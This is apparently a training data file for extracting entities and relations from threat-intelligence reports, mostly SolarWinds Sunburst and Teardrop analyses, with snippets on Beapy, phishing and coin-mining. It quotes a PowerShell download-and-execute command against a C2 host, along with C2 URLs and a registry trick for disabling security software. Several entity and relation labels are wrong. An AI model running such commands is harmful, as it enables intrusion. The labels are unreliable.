{"instruction": "E8 ?? ?? ?? ?? // call sub_1800101D0 48 8D 4C 24 ?? // lea rcx, [rsp+1A0h+var_140] 49 8B D7 // mov rdx, r15 48 8D 0C 99 // lea rcx, [rcx+rbx*4] BB 20 00 00 00 // mov ebx, 20h 44 8B C3 // mov r8d, ebx E8 ?? ?? ?? ?? // call sub_180010ED0 44 8B 85 ?? ?? 00 00 // mov r8d, dword ptr [rbp+0A0h+arg_0] 48 8B D6 // mov rdx, rsi ; _QWORD 49 C1 E8 04 // shr r8, 4 ; _QWORD 48 8B CF // mov rcx, rdi ; _QWORD FF 15 ?? ?? ?? ?? // call cs:qword_180056E90 8B 95 ?? ?? 00 00 // mov edx, dword ptr [rbp+0A0h+arg_0] 4C 8D 85 ?? ?? 00 00 // lea r8, [rbp+0A0h+dwSize] 48 83 A5 ?? ?? 00 00 00 // and [rbp+0A0h+dwSize], 0 48 8B CE // mov rcx, rsi", "input": null, "output": "No related entities and relations."}
{"instruction": "E8 ?? ?? ?? ?? // call sub_180009630 48 8B 95 ?? ?? 00 00 // mov rdx, [rbp+0A0h+dwSize] ; dwSize 44 8B CB // mov r9d, ebx ; flProtect 41 B8 00 10 00 00 // mov r8d, 1000h ; flAllocationType 33 C9 // xor ecx, ecx ; lpAddress FF 15 ?? ?? ?? ?? // call cs:VirtualAlloc 48 8B 95 ?? ?? 00 00 // mov rdx, [rbp+0A0h+dwSize] ; dwSize 4C 8D 8D ?? ?? 00 00 // lea r9, [rbp+0A0h+flOldProtect] ; lpflOldProtect 48 8B C8 // mov rcx, rax ; lpAddress 41 B8 04 00 00 00 // mov r8d, 4 ; flNewProtect 48 8B D8 // mov rbx, rax FF 15 ?? ?? ?? ?? // call cs:VirtualProtect 4C 8D 8D ?? ?? 00 00 // lea r9, [rbp+0A0h+arg_0] 4C 8B C6 // mov r8, rsi", "input": null, "output": "No related entities and relations."}
{"instruction": "SolarWinds: Insights into Attacker Command and Control Process", "input": null, "output": "Named Entities: (SolarWinds, malware)\nRelationships: No related relations."}
{"instruction": "In the third of a series of follow-up analysis on the SolarWinds attacks, we investigate how the attackers controlled the Sunburst malware. \nIn our most recent blog on the SolarWinds attacks , we examined the domain generation algorithm (DGA) used to initiate contact with the attackers\u2019 command and control (C&C) servers. The control flow, what happens after that contact is made, is also noteworthy. \nThe control flow of Sunburst varies depending on commands received from the attacker. However, the general control flow can be reconstructed in order to understand how communications would have progressed on machines that were of interest to the attackers. \nAs described in our previous blog, two types of DNS requests are used for initial communications, and both receive DNS replies.\u00a0The attackers use two fields in the DNS replies: \u201cA records\u201d for control flow and CNAME to hold data on a secondary C&C server.", "input": null, "output": "Named Entities: (SolarWinds, malware), (Sunburst, malware), (C&C servers, tool)\nRelationships: (SolarWinds, control, Sunburst), (Sunburst, contact, C&C servers)"}
{"instruction": "IP addresses as commands Normally, when querying DNS, a hostname string is provided to be translated into a numeric IP address, e.g., google.com may translate into 142.250.72.238. The IP address is held in the A record of the response. Sunburst parses the A record for IP addresses, but they are not used as IP addresses at all, but instead are actually triggers for different malware behavior. Instead of the attackers selecting random IP addresses to trigger different behaviors, they have selected IP address ranges belonging to Google, Amazon, and Microsoft. These are possibly chosen in order to reduce the chances of detection. Again, these IPs are not used as IP addresses in any way and the actual computer systems with these IP addresses are not contacted by the malware. The IP address value received in the DNS reply represents one of five behaviors depending on the current state:", "input": null, "output": "Named Entities: (Sunburst, malware), (google.com, Domain), (142.250.72.238, IP)\nRelationships: (google.com, ranslate into, 142.250.72.238)"}
{"instruction": "Continue sending additional Windows domain name chunks Send product security status information Launch a secondary C&C channel Clean up and exit Reset state as if executing for the first time For a typical infection, Sunburst will first send to the C&C server the first 14 characters of the Windows domain name. This will continue for each 14 character chunk, until the entire Windows Domain name is sent. Next, the attackers will instruct Sunburst to send the current security product statuses and then send information enabling Sunburst to launch a more robust secondary HTTP-based C&C. Figure 1. Example of C&C control flow Within any DNS reply, the attackers can also instead instruct Sunburst to restore security product service registry keys that were previously disabled back to their believed default settings and quit or reset the internal state as if it is a fresh infection.", "input": null, "output": "Named Entities: (Sunburst, malware), (C&C server, tool), (HTTP-based C&C, tool)\nRelationships: (Sunburst, send to, C&C server), (Sunburst, launch, HTTP-based C&C)"}
{"instruction": "Figure 2. IP address ranges and the behaviors they cause In addition, to facilitate lab environment and sandbox avoidance, if the DNS requests result in a private range IP address, including 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 224.0.0.0/4, fc00::/7, fec0::/10, ff00::/8, Sunburst will also clean up and exit.", "input": null, "output": "Named Entities: (Sunburst, malware), (10.0.0.0/8, IP), (172.16.0.0/12, IP), (192.168.0.0/16, IP), (224.0.0.0/4, IP)\nRelationships: No related relations."}
{"instruction": "Second stage C&C Victims that were of interest to the attackers would have reached the secondary C&C stage. In this case, the DNS reply would contain a hostname in the CNAME record to be used as a HTTP C&C channel. The CNAME value is checked to see if it starts with http:// or https:// and is prepended with https:// otherwise. Next, Sunburst will perform repeated HTTP GET requests to receive commands, sleeping a variable amount of time between requests. The path portion of the URL always starts with /swip/upd/ followed by randomly selected URL patterns, in the following order. Optionally, one or more of the following: SolarWinds .CortexPlugin .Orion Optionally, followed by one of the following: .Wireless .UI .Widgets .NPM .Apollo .CloudMonitoring If no previous string has been selected, one of the following or optionally, one of the following if a previous string has been selected: .Nodes .Volumes .Interfaces .Components", "input": null, "output": "Named Entities: (Sunburst, malware)\nRelationships: No related relations."}
{"instruction": "Optionally, followed by: -<number>.<number>.<error or success code of previous request> Followed by: .xml Also, if the first character in the path is a dot (.), the dot is removed. For example, the following are example URLs that could be used: https[:]//infinitysoftwares.com/swip/upd/SolarWinds.CortexPlugin.Nodes-5.2.1.xml https[:]//infinitysoftwares.com/swip/upd/Orion.Wireless.UI-3.1.0.xml https[:]//infinitysoftwares.com/swip/upd/Nodes-1.2.0.xml The final digit before the .xml extension is not a random character, but represents the return code for previous command requests \u2013 typically 0 means success and 1 or other values mean error. For the first 16 requests, a different randomly generated path is used each time, but after that it may repeat random generations that it used previously. If data is being sent to the attacker as a result of a command (e.g. sending system information), the path construction will be different and will be covered in a future blog.", "input": null, "output": "Named Entities: (https[:]//infinitysoftwares.com/swip/upd/SolarWinds.CortexPlugin.Nodes-5.2.1.xml, URL), (https[:]//infinitysoftwares.com/swip/upd/Orion.Wireless.UI-3.1.0.xml, URL), (https[:]//infinitysoftwares.com/swip/upd/Nodes-1.2.0.xml, URL)\nRelationships: No related relations."}
{"instruction": "Sunburst also adds the custom header \u201cIf-None-Match:\u201d set to the previously described 8-byte userid XOR\u2019d by a randomly generated 8-byte sequence that is appended and then converted into lowercase ASCII hex. Figure 3. Sunburst custom header After the HTTP GET request is made, Sunburst checks for a valid response from the attacker. The response uses steganography and is a faux, but convincing XML page of data, where only certain fields are utilized by Sunburst. The faux XML data is searched for a sequence of: 36 hexadecimal characters including dashes 32 hexadecimal characters 16 hexadecimal characters", "input": null, "output": "Named Entities: (Sunburst, malware)\nRelationships: No related relations."}
{"instruction": "These sequences are concatenated together with non-hexadecimal characters removed. The first DWORD (4 bytes) of the sequence represents the size of the remaining data, which is validated and then the next byte is an XOR key. The rest of the data is then XOR decrypted by the key byte and then decompressed. After being decompressed, the first character is a number that specifies the action to perform followed by the number of included arguments in the following data for the command: Figure 4. A contrived example of data received by Sunburst that is decoded to extract the command The command number can instruct Sunburst to perform the following behaviors: Figure 5. Command numbers and corresponding behaviors If no data needs to be sent to the attacker, the above GET request with the return code encoded in the URL filename is sent.", "input": null, "output": "Named Entities: (Sunburst, malware)\nRelationships: No related relations."}
{"instruction": "If data needs to be sent to the attacker as a result of these commands (e.g. sending system information), the data will be included in the next regular HTTP(S) communication as a POST request or a HEAD request if some error occurred where the data is missing. Details on each of these behaviors and how data is uploaded to the attacker will be covered in an upcoming blog.", "input": null, "output": "No related entities and relations."}
{"instruction": "SolarWinds: How a Rare DGA\u00a0Helped Attacker Communications Fly Under the Radar", "input": null, "output": "Named Entities: (SolarWinds, malware)\nRelationships: No related relations."}
{"instruction": "Sunburst (Backdoor.Sunburst), the malware which was used to Trojanize the SolarWinds Orion software, uses a domain generation algorithm (DGA) to generate domain names to contact for C&C purposes. However, unlike most DGAs, this DGA does not just randomly generate characters. Instead, information is encoded into the text that makes up the generated domain names. By doing so, initial C&C actually happens via DNS, which provides a stealthier level of communications.", "input": null, "output": "Named Entities: (Sunburst, malware), (Backdoor.Sunburst, malware), (SolarWinds Orion software, tool), (C&C, tool)\nRelationships: (Sunburst, aka, Backdoor.Sunburst), (Sunburst, Trojanize, SolarWinds Orion software), (Sunburst, contact, C&C)"}
{"instruction": "For each infected computer, Sunburst generates a unique ID, referred to as a userid. The userid is made up of the first active MAC address that is not the loopback address, concatenated with the Windows Domain name of the computer, and then concatenated with the Windows installation UUID, a randomly generated value at Windows installation time stored in HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid. These three values are then MD5 hashed and the first 64 bits are XOR\u2019d with the last 64 bits, resulting in a unique 64-bit userid.", "input": null, "output": "Named Entities: (Sunburst, malware)\nRelationships: No related relations."}
{"instruction": "Because multiple DNS requests will have to be made to transmit all payload information, the attackers require a unique ID to know from which computer the information is coming from. DNS is a distributed protocol, meaning the infected computer does not contact the attacker\u2019s C&C server directly, but instead the DNS request is passed through multiple intermediaries before reaching the attacker DNS server. Only by including the userid within the DNS request will the attackers be able to combine the multiple requests. The DNS lookup will be in one of the following forms: <encoded information>.appsync-api.eu-west-1.avsvmcloud.com <encoded information>.appsync-api.us-west-2.avsvmcloud.com <encoded information>.appsync-api.us-east-1.avsvmcloud.com <encoded information>.appsync-api.us-east-2.avsvmcloud.com The encoded information will be in one of two forms providing the attackers either the Windows domain name of the infected organization or security product statuses and feedback on the infected machine.", "input": null, "output": "Named Entities: (C&C server, tool), (appsync-api.eu-west-1.avsvmcloud.com, Domain), (appsync-api.us-west-2.avsvmcloud.com, Domain), (appsync-api.us-east-1.avsvmcloud.com, Domain), (appsync-api.us-east-2.avsvmcloud.com, Domain)\nRelationships: No related relations."}
{"instruction": "Sunburst will also resend previously sent chunks if an error was encountered or, under certain error conditions, set the chunk number to a negative one. The segment chunk number and the Windows domain name are both encoded separately and appended to the encoded userid. These elements form the subdomain of the domain. This domain is queried via DNS, which results in this encoded information reaching the attacker\u2019s DNS server. The attacker can then decode the information and reply with further instructions, which will be covered in a future blog. Figure 1. Structure of Sunburst DNS lookups", "input": null, "output": "Named Entities: (Sunburst, malware)\nRelationships: No related relations."}
{"instruction": "The two bytes contain a bitmask that encodes information on whether any of the following security products were not found, or found running and/or subsequently disabled and stopped: CrowdStrike Carbon Black FireEye ESET F-Secure Microsoft Defender The userid, timestamp, feedback bit, and optional security product data are then encoded into text as the subdomain of a DNS query that is sent to the attackers. Figure 2. Structure of second DNS lookup communicating security product status The responses to these DNS queries may then contain control information for the threat to terminate or launch a secondary HTTP communication channel, something that we plan to cover in a subsequent blog.", "input": null, "output": "No related entities and relations."}
{"instruction": "SolarWinds Attacks: Stealthy Attackers Attempted To Evade Detection", "input": null, "output": "Named Entities: (SolarWinds, attacker)\nRelationships: No related relations."}
{"instruction": "In the first of a series of follow-up analysis on the SolarWinds attacks, we take a look at how the attackers disabled security software and avoided detection As we continue our analysis on the tools used in the SolarWinds attacks , one of the most striking aspects we\u2019ve noticed is how careful the attackers were to avoid drawing attention to themselves. Software supply chain attacks are relatively stealthy to begin with, since signed software from a trusted source is less likely to raise red flags. However, the attackers weren\u2019t content to rely on the cover this provided and also took several other steps to avoid detection. To begin with, the Sunburst backdoor (Backdoor.Sunburst), which was delivered using a Trojanized update to SolarWinds Orion, sets a delay time of up to 14 days before execution. In other words, no malicious activity will begin until this period has elapsed.", "input": null, "output": "Named Entities: (SolarWinds Orion, tool), (Sunburst backdoor, malware), (Backdoor.Sunburst, malware)\nRelationships: (Sunburst backdoor, delivered using, SolarWinds Orion), (Sunburst backdoor, aka, Backdoor.Sunburst)"}
{"instruction": "The length of time selected is most likely to increase the likelihood that the log entries of the initial malicious activity have been deleted before any subsequent post-breach activity is initiated, thereby making it difficult to correlate the two sets of malicious events. Many organizations, including even managed security services providers (MSSPs), will often purge their security logs after seven days to minimize storage costs and make searching them easier. Sunburst will also check the current Windows domain the machine belongs to. If the domain contains the string 'test' or one of 13 additional specific domains that appear related to lab systems such as \u201cswdev.local\u201d and \u201capac.lab\u201d, the threat will cease to execute. A full list is in Appendix A.", "input": null, "output": "Named Entities: (Sunburst, malware)\nRelationships: No related relations."}
{"instruction": "Avoiding Security Software and Researchers Attacks begin with a Trojanized version of SolarWinds\u2019 Orion software. The attackers modified Orion in order to deliver the Sunburst backdoor to the computer. Sunburst is first stage malware, designed to perform reconnaissance on the infected computer, perform checks for security tools, and deliver a second stage payload, if required.", "input": null, "output": "Named Entities: (SolarWinds' Orion software, tool), (Sunburst, malware)\nRelationships: (SolarWinds' Orion software, deliver, Sunburst)"}
{"instruction": "Disabling security software Sunburst also attempts to specifically disable some software security services via the registry. This allows Sunburst to perform its malicious actions completely undetected. If the attackers worked quickly and restored the services afterwards, a security administrator would potentially have no record of the activity, nor have even noticed the temporary lack of protection. Figure 1. Example of how Sunburst disables security software. In this case it checks if the CrowdStrike processes csfalconservice or csfalconcontainer are running, and if so, it sets the csagent, csfalconservice, and csdevicecontrol services to be disabled. This function will: Get a list of running processes Check if the process names match items on the process/services name pair list Disable the security software by modifying its service registry entry", "input": null, "output": "Named Entities: (Sunburst, malware), (CrowdStrike processes, tool), (csfalconservice, tool), (csfalconcontainer, tool), (csagent, tool), (csdevicecontrol, tool)\nRelationships: (Sunburst, disable, CrowdStrike processes), (CrowdStrike processes, disable, csagent), (CrowdStrike processes, disable, csfalconservice), (CrowdStrike processes, disable, csdevicecontrol)"}
{"instruction": "After the software has been confirmed to be disabled, usually after a reboot, the malicious code will then contact the command and control (C&C) server and potentially perform further malicious actions To disable the security software, Sunburst will simply set the products\u2019 service start setting to Disabled. In Windows, this is done by setting the registry keys: HKLM\\ SYSTEM\\CurrentControlSet\\services\\<service name>\\Start = 4 This will cause the security software not to load at the next reboot. It should be noted that the attackers do not attempt to disable any Symantec products. Presumably this is because of an anti-tampering feature in Symantec software, which prevents its own service from being disabled. The process and services pair list include software from the following vendors: CrowdStrike Carbon Black FireEye ESET F-Secure", "input": null, "output": "Named Entities: (Sunburst, malware), (C&C server, tool)\nRelationships: (Sunburst, contact, C&C server)"}
{"instruction": "Interestingly, the list also included Microsoft Defender, but only the service key permissions are changed. Currently, this has an unknown effect. In addition, some other unknown products are also included, but were effectively commented out. The attackers may have discovered this technique was ineffective for these products. Finally, Sunburst will check if api.solarwinds.com resolves to a valid address before continuing.", "input": null, "output": "Named Entities: (Sunburst, malware), (api.solarwinds.com, Domain)\nRelationships: (Sunburst, check, api.solarwinds.com)"}
{"instruction": "Low profile threat \nThe SolarWinds attacks are among the best-planned and adept attacks we have seen in recent years. The attackers have gone to great lengths to both find an effective path into their targeted organizations and, once inside their networks, maintain a low profile. Our analysis of these tools is ongoing and we plan to publish further blogs in the coming weeks.", "input": null, "output": "No related entities and relations."}
{"instruction": "Appendix A Drivers Avoided Driver FNV1A Hash Description ybkerneltracker.sys 17097380490166623672 atrsdfw.sys 15194901817027173566 Altiris Symantec (Ghost Preinstallion boot environment driver) eaw.sys 12718416789200275332 Raytheon Cyber Solutions rvsavd.sys 18392881921099771407 CJSC Returnil Software dgdmk.sys 3626142665768487764 Verdasys sentinelmonitor.sys 12343334044036541897 Sentinel hexisfsmonitor.sys 397780960855462669 Sentinel One groundling32.sys 6943102301517884811 Dell SecureWorks groundling64.sys 13544031715334011032 Dell SecureWorks safe-agent.sys 11801746708619571308 SAFE-Cyberdefense crexecprev.sys 18159703063075866524 Absolute (Palisade Systems) psepfilter.sys 835151375515278827 Absolute cve.sys 16570804352575357627 Absolute brfilter.sys 1614465773938842903 Bromium brcow_x_x_x_x.sys 12679195163651834776 Bromium lragentmf.sys 2717025511528702475 LogRhythm libwamf.sys 17984632978012874803 OESIS OPSwat Security Tools Avoided Tool FNV1A Hash apimonitor-x64 2597124982561782591 apimonitor-x86 2600364143812063535 autopsy64 13464308873961738403 autopsy 4821863173800309721 autoruns64 12969190449276002545 autoruns 3320026265773918739 autorunsc64 12094027092655598256 autorunsc 10657751674541025650 binaryninja 11913842725949116895 blacklight 5449730069165757263 cff explorer 292198192373389586 cutter 12790084614253405985 de4dot 5219431737322569038 debugview 15535773470978271326 diskmon 7810436520414958497 dnsd 13316211011159594063 dnspy 13825071784440082496 dotpeek32 14480775929210717493 dotpeek64 14482658293117931546 dumpcap 8473756179280619170 evidence center 3778500091710709090 exeinfope 8799118153397725683 fakedns 12027963942392743532 fakenet 576626207276463000 ffdec 7412338704062093516 fiddler 682250828679635420 fileinsight 13014156621614176974 floss 18150909006539876521 gdb 10336842116636872171 hiew32 13260224381505715848 unknown 17956969551821596225 hiew32demo 12785322942775634499 idaq64 8709004393777297355 idaq 14256853800858727521", "input": null, "output": "Named Entities: (ybkerneltracker.sys, file), (atrsdfw.sys, file), (eaw.sys, file), (rvsavd.sys, file), (dgdmk.sys, file), (hexisfsmonitor.sys, file), (groundling32.sys, file), (groundling64.sys, file), (safe-agent.sys, file), (crexecprev.sys, file), (psepfilter.sys, file), (cve.sys, file), (brfilter.sys, file), (brcow_x_x_x_x.sys, file), (lragentmf.sys, file), (libwamf.sys, file), (apimonitor-x64, tool), (apimonitor-x86, tool), (autopsy64, tool), (autopsy, tool), (autoruns64, tool), (autoruns, tool), (autorunsc64, tool), (autorunsc, tool), (binaryninja, tool), (blacklight, tool), (cff explorer, tool), (cutter, tool), (de4dot, tool), (debugview, tool), (diskmon, tool), (dnsd, tool), (dnspy, tool), (dotpeek32, tool), (dotpeek64, tool), (dumpcap, tool), (evidence center, tool), (exeinfope, tool), (fakedns, tool), (fakenet, tool), (ffdec, tool), (fiddler, tool), (fileinsight, tool), (floss, tool), (gdb, tool), (hiew32, tool), (hiew32demo, tool), (idaq64, tool), (idaq, tool)\nRelationships: No related relations."}
{"instruction": "fsgk32 13655261125244647696 (unknown) fsma32 fsaua fssm32 fsma fnrb32 3425260965299690882 (unknown) fsaua fsbts fsorsp fsni fsav32 fsvista 13783346438774742614 (unknown) 2380224015317016190 (unknown) fses fsfw fsdfw fsaus fsms fsdevcon 14243671177281069512 (unknown) 16112751343173365533 (unknown)", "input": null, "output": "No related entities and relations."}
{"instruction": "Sunburst analysis An existing SolarWinds DLL called SolarWinds.Orion.Core.BusinessLayer.dll was modified by the attackers to include an added class. The malware is designed to remain inactive for a period after installation. It will then attempt to resolve a subdomain of avsvmcloud[.]com. The DNS response will deliver a CNAME record that directs to a command and control (C&C) domain. In SolarWinds.Orion.Core.BusinessLayer.BackgroundInventory.InventoryManager.RefreshInterval() code is added to call OrionImprovementBusinessLayer.Initialize(). OrionImprovementBusinessLayer is a malicious class added by the attacker. It has the following functionality: Terminates the backdoor thread Set delay time before execution Collect and upload system information including: Domain SID of administrator account Hostname Username Operating system version Path of system directory Days elapsed since the system started Information on network adapters, including: Description MACAddress DHCPEnabled DHCPServer DNSHostName DNSDomainSuffixSearchOrder DNSServerSearchOrder IPAddress IPSubnet DefaultIPGateway Download and run code Iterate the file system Create and delete files Calculate file hashes Read, write, and delete registry entries", "input": null, "output": "Named Entities: (Sunburst, malware), (SolarWinds.Orion.Core.BusinessLayer.dll, file), (avsvmcloud[.]com, Domain)\nRelationships: (Sunburst, modify, SolarWinds.Orion.Core.BusinessLayer.dll), (Sunburst, attempt to resolve, avsvmcloud[.]com)"}
{"instruction": "Second-stage payload: Teardrop \nA second stage payload, a backdoor called Teardrop, is deployed against a targets of interest to the attackers. Symantec has observed two variants of Teardrop, both of which behave similarly and are used to deliver a further payload \u2013 the Cobalt Strike commodity malware. \nThe first variant (SHA256: b820e8a2057112d0ed73bd7995201dbed79a79e13c79d4bdad81a22f12387e07) is a DLL. The malicious code is contained in the export Tk_CreateImageType, ordinal 209. When executed, that malicious code reads a file named upbeat_anxiety.jpg from the current directory and ensures it has a jpg header. It will also check that the registry key HKCU\\Software\\Microsoft\\CTF exists. An embedded copy of Cobalt Strike is then extracted and executed. That CobaltStrike sample connects to infinitysoftwares[.]com for command and control. \nThe second variant (SHA256:1817a5bf9c01035bcf8a975c9f1d94b0ce7f6a200339485d8f93859f8f6d730c) is similar, except that the file it loads is called festive_computer.jpg. The embedded CobaltStrike payload connects to ervsystem[.]com for command and control.", "input": null, "output": "Named Entities: (Teardrop, malware), (Cobalt Strike, malware), (b820e8a2057112d0ed73bd7995201dbed79a79e13c79d4bdad81a22f12387e07, SHA256), (upbeat_anxiety.jpg, file), (infinitysoftwares[.]com, Domain), (1817a5bf9c01035bcf8a975c9f1d94b0ce7f6a200339485d8f93859f8f6d730c, SHA256), (festive_computer.jpg, file), (ervsystem[.]com, Domain)\nRelationships: (Teardrop, deploy, Cobalt Strike), (b820e8a2057112d0ed73bd7995201dbed79a79e13c79d4bdad81a22f12387e07, load, upbeat_anxiety.jpg), (1817a5bf9c01035bcf8a975c9f1d94b0ce7f6a200339485d8f93859f8f6d730c, load, festive_computer.jpg)"}
{"instruction": "The Backdoor.Teardrop sample is a DLL with malicious code contained in the export Tk_CreateImageType. When executed, that export reads a file named upbeat_anxiety.jpg from the current directory and ensures it has a jpg header. It will also check that the registry key HKCU\\Software\\Microsoft\\CTF exists. An embedded copy of Cobalt Strike is then extracted. That CobaltStrike samples connects a C&C server - infinitysoftwares[.]com. At this point, the attackers launch WMI to execute rundll32.exe to load another malicious DLL called resources.dll in the path csidl_windows\\desktoptileresources\\. Resources.dll attempts to obtain credentials by accessing lsass.exe using similar techniques to Mimikatz, a widely used credential dumping tool.", "input": null, "output": "Named Entities: (Backdoor.Teardrop, malware), (upbeat_anxiety.jpg, file), (Cobalt Strike, tool), (infinitysoftwares[.]com, Domain), (rundll32.exe, file), (resources.dll, file), (lsass.exe, file), (Mimikatz, tool)\nRelationships: (Backdoor.Teardrop, extract, Cobalt Strike), (Cobalt Strike, connect, infinitysoftwares[.]com), (rundll32.exe, load, resources.dll), (resources.dll, access, lsass.exe), (resources.dll, use, Mimikatz)"}
{"instruction": "Spammers, scammers, and other threat actors quick to take advantage of global panic surrounding coronavirus outbreak Cyber criminals are rushing to take advantage of the COVID-19 pandemic and in recent weeks Symantec has observed dozens of new malicious email campaigns attempting to leverage public fears about the virus. The threat actors behind these campaigns have employed a range of tactics in a bid to evade detection, such as using a variety of email templates along with heavy randomization of subject lines, \u201cFrom\u201d addresses, IP addresses, and URL domains.", "input": null, "output": "Named Entities: (Spammers, attacker), (scammers, attacker), (threat actors, attacker), (malicious email campaigns, threat type), (email templates, tool), (subject lines, tool), (\u201cFrom\u201d addresses, tool), (IP addresses, tool), (URL domains, tool)\nRelationships: (malicious email campaigns, employ, email templates), (malicious email campaigns, employ, subject lines), (malicious email campaigns, employ, \u201cFrom\u201d addresses), (malicious email campaigns, employ, IP addresses), (malicious email campaigns, employ, URL domains)"}
{"instruction": "CDC phishing emails Figure 5. Phishing email purporting to come from the U.S. Centers for Disease Control and Prevention (CDC) This email is crafted to appear as a message from the U.S. Centers for Disease Control and Prevention (CDC). It explains that the CDC is closely monitoring the coronavirus outbreak and has established an Incident Management System to coordinate a domestic and international public health response. The recipient is then urged to click on a link that purports to lead to a list of new cases around their city. While the domain used in text appears to be \u201ccdcinfo.gov\u201d, hovering the cursor over the link will reveal the real, malicious URL the link leads to: When clicked, it routes to:", "input": null, "output": "Named Entities: (CDC phishing emails, threat type), (cdcinfo.gov, Domain)\nRelationships: No related relations."}
{"instruction": "On at least two victim networks, Tortoiseshell deployed its information gathering tools to the Netlogon folder on a domain controller. This results in the information gathering tools being executed automatically when a client computer logs into the domain. This activity indicates the attackers had achieved domain admin level access on these networks, meaning they had access to all machines on the network.", "input": null, "output": "Named Entities: (Tortoiseshell, attacker), (information gathering tools, tool), (domain controller, tool), (client computer, tool)\nRelationships: (Tortoiseshell, deploy, information gathering tools)"}
{"instruction": "Figure 3. Top 10 BEC keywords, July 2018 - June 2019 Top 10 BEC sender domains Email scammers have been known to use so-called cousin domains\u2014for example \" [email protected] \" instead of \"symantec.com\". BEC scammers appear to have gone easy on these cousin domains in the last 12 months, and have gone back to using free web accounts and web mailers, such as gmail.com, yahoo.com, aol.com, and inbox.lv. Using and/or spoofing such legitimate domains also lends legitimacy to the scam. Four popular email services\u2014including Gmail, AOL, Yahoo! Mail, and Hotmail\u2014are among the 10 top most abused domains from which BEC emails are sent, with Gmail and AOL bearing the brunt. What's most surprising here is that AOL, which experienced a sharp decline in subscribers back in 2007, apparently remains a top choice for BEC scammers. Figure 4. Top 10 BEC sender domains, July 2018 - June 2019", "input": null, "output": "Named Entities: (symantec.com, Domain), (gmail.com, Domain), (yahoo.com, Domain), (aol.com, Domain), (inbox.lv, Domain)\nRelationships: No related relations."}
{"instruction": "Figure 6. Packet trace shows the creative.strpjmp.com domain making a GET request to itself, creating an infinite number of requests Three JavaScript codes Looking at the three JavaScript codes, we initially believed that the app was originally designed to simulate clicking behind the scenes in order to generate ad revenues and increase web traffic (click fraud). However, the clicking events were not seen in action, even though all JavaScript codes were indeed loaded. Nonetheless, we cannot entirely dismiss the possibility of the malware being used for click fraud or some other malicious end. From the source code, we can see that the contents of the JavaScript were indeed executed in the code, and they are entirely controlled by the server, which implies that the content can be easily changed as and when desired. Figure 7. Source code showing the extraction of Link, Agent, and the three JavaScript codes", "input": null, "output": "Named Entities: (creative.strpjmp.com, Domain), (JavaScript codes, tool)\nRelationships: (creative.strpjmp.com, make GET request to, creative.strpjmp.com), (JavaScript codes, loaded in, creative.strpjmp.com)"}
{"instruction": "The other extension, Mp3 Songs Download, claims to be an MP3 downloader but just redirects the user to an MP3 download website when they click on the extension button. The MP3 download website secretly launches a coin-mining script in the background. The Mp3 Songs Download extension was published in June 2017 and has around 4,000 users. Figure 3. The Mp3 Songs Download Chrome extension has almost 4,000 users Figure 4. Mp3 Songs Download asks users to click on icon that redirects them to a website which runs a coin-mining script Coin-mining script: 2048 The source code for the 2048 extension contains a hardcoded domain that is triggered when Chrome is launched. Figure 5. 2048 extension source code contains hardcoded domain that is called when Chrome launches The form in http://www.madafak[DOT]in/landing sends a POST request with a hidden field to www.madafak[DOT]in after one second. Figure 6. POST request with hidden field", "input": null, "output": "Named Entities: (Mp3 Songs Download, tool), (coin-mining script, tool), (2048 extension, tool), (http://www.madafak[DOT]in/landing, URL), (www.madafak[DOT]in, Domain)\nRelationships: (http://www.madafak[DOT]in/landing, send POST request to, www.madafak[DOT]in)"}
{"instruction": "Once DoublePulsar is installed, a PowerShell command is executed, and contact is made with the Beapy command and control (C&C) server, before a coinminer is downloaded onto the target computer. If we look at one example of a machine in Symantec telemetry, we see the earliest signs of suspicious activity on February 15, 2019, when the DoublePulsar backdoor is detected. We then see a PowerShell command being launched, which decodes to the following: IEX (New-Object Net.WebClient).downloadstring(' http://v.beahh.com/v' +$env:USERDOMAIN) This is the device contacting the Beapy C&C server. Some more PowerShell commands are executed and then a Monero coinminer is downloaded. This process is repeated as Beapy spreads to other computers on the network.", "input": null, "output": "Named Entities: (DoublePulsar, malware), (Beapy, tool), (v.beahh.com, Domain)\nRelationships: No related relations."}
{"instruction": "Since the email requires a static link, HTTP POST web requests are not really an option, meaning the booking reference code and the email are passed as arguments in the URL itself. On its own, this would not be an issue. However, many sites directly load additional content on the same website, such as advertisements. This means that direct access is shared either directly with other resources or indirectly through the referrer field in the HTTP request. My tests have shown that an average of 176 requests are generated per booking, although not all these requests contain the booking details. This number indicates that the booking data could be shared quite widely. To demonstrate, let's assume the confirmation email contains a link in the following format, which would automatically log me into my booking overview: https://booking.the-hotel.tld/retrieve.php?prn=1234567& [email protected]", "input": null, "output": "Named Entities: (https://booking.the-hotel.tld/retrieve.php?prn=1234567&, URL)\nRelationships: No related relations."}
{"instruction": "The chfeeds.vbe file acts as a downloader and was used to download a second PowerShell script (registry.ps1). This script in turn downloaded and executed a PowerShell backdoor known as POSHC2, a proxy-aware C&C framework, from the C&C server (hxxps:// host-manager.hopto.org). Later at 20:57, the attackers became active on the compromised machine and proceeded to download the archiving tool WinRAR. 89.34.237.118 808 hxxp://89.34.237[DOT]118:808/Rar32.exe At 23:29, the attackers then proceeded to deploy an updated version of their POSHC2 stager. 192.119.15.35 880 hxxp://mynetwork.ddns[DOT]net:880/st-36-p4578.ps1 This tool was downloaded several times between 23:29 on February 12 and 07:47 on February 13. Two days later, on February 14 at 15:12, the attackers returned and installed Quasar RAT onto the infected computer that communicated with a C&C server (217.147.168.123). Quasar RAT was installed to CSIDL_PROFILE\\appdata\\roaming\\microsoft\\crypto\\smss.exe.", "input": null, "output": "Named Entities: (chfeeds.vbe, file), (downloader, tool), (PowerShell script, tool), (registry.ps1, file), (POSHC2, malware), (C&C server, tool), (host-manager.hopto.org, Domain), (WinRAR, tool), (89.34.237.118, IP), (Rar32.exe, file), (POSHC2 stager, tool), (192.119.15.35, IP), (mynetwork.ddns.net, Domain), (Quasar RAT, malware), (217.147.168.123, IP), (smss.exe, file)\nRelationships: (chfeeds.vbe, acts as, downloader), (downloader, download, PowerShell script), (PowerShell script, download, registry.ps1), (registry.ps1, download, POSHC2), (POSHC2, communicate with, C&C server), (C&C server, domain, host-manager.hopto.org), (attackers, download, WinRAR), (attackers, download, POSHC2 stager), (POSHC2 stager, communicate with, C&C server), (C&C server, IP, 89.34.237.118), (89.34.237.118, download, Rar32.exe), (attackers, deploy, updated version of POSHC2 stager), (updated version of POSHC2 stager, communicate with, C&C server), (C&C server, IP, 192.119.15.35), (Quasar RAT, communicate with, C&C server), (C&C server, IP, 217.147.168.123), (Quasar RAT, installed to, smss.exe)"}
